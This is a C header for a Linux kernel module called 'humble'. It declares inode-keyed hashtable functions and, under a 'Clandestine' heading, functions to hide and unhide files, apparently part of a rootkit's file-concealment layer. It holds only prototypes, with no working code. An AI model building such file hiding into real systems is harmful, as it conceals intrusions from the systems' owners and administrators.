#ifndef HUMBLE_H__
#define HUMBLE_H__

#include <linux/fs.h>
#include <linux/types.h>

/* Hashtable */
extern int humble_hash_contains(u64 ino);
extern int humble_hash_add(struct inode *file, struct inode *dir);
extern int humble_hash_remove(u64 ino);
extern int humble_hash_clear(void);

/* Clandestine */
extern int humble_hide_file(const char *path, u64 *ino);
extern int humble_unhide_file(u64 ino);

#endif
